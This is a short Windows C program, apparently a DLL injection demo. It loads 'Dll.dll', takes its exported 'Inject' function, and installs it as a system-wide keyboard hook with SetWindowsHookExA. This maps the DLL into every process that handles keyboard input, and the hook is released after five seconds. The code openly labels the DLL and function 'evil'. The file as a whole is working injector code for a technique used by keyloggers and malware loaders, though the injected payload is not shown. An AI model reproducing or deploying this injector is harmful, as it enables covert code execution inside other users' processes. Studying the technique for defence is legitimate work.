#include <windows.h>

// Declearing the pointer for the function that injects
typedef void(_cdecl* InjProc)();

int main() {

	InjProc injFunc;
	HINSTANCE evilDll;

	// Importing DLL
	evilDll = LoadLibraryA("Dll.dll");

	// Choosing our evil funtion from DLL
	injFunc = (InjProc) GetProcAddress(evilDll, "Inject");

	// Setting a hook that catches keyboard signals
	HHOOK hook = SetWindowsHookExA(WH_KEYBOARD, (HOOKPROC)injFunc, evilDll, 0);

	// Waiting 5 seconds
	Sleep(5000);

	// Releasing the hook
	UnhookWindowsHookEx(hook);

	return 0;
}